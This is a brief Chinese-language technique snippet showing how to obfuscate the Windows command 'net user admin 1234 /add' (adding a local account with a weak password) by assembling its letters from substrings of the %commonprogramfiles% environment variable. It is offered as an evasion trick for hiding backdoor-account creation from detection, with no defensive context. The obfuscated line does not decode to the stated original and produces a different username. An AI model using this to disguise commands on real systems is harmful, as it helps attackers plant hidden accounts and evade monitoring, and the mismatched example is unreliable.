## 利用windows环境变量混淆cmd命令
原命令
```
net user admin 1234 /add
```

混淆后：
```
%commonprogramfiles:~22,1%%commonprogramfiles:~14,1%t%commonprogramfiles:~10,1%u%commonprogramfiles:~15,1%%commonprogramfiles:~14,1%%commonprogramfiles:~4,1%%commonprogramfiles:~10,1%%commonprogramfiles:~0,1%%commonprogramfiles:~8,1%%commonprogramfiles:~12,1%zh%commonprogramfiles:~12,1%%commonprogramfiles:~6,1%%commonprogramfiles:~8,1%%commonprogramfiles:~22,1%%commonprogramfiles:~6,1%%commonprogramfiles:~10,1%1234%commonprogramfiles:~10,1%/%commonprogramfiles:~8,1%dd
```
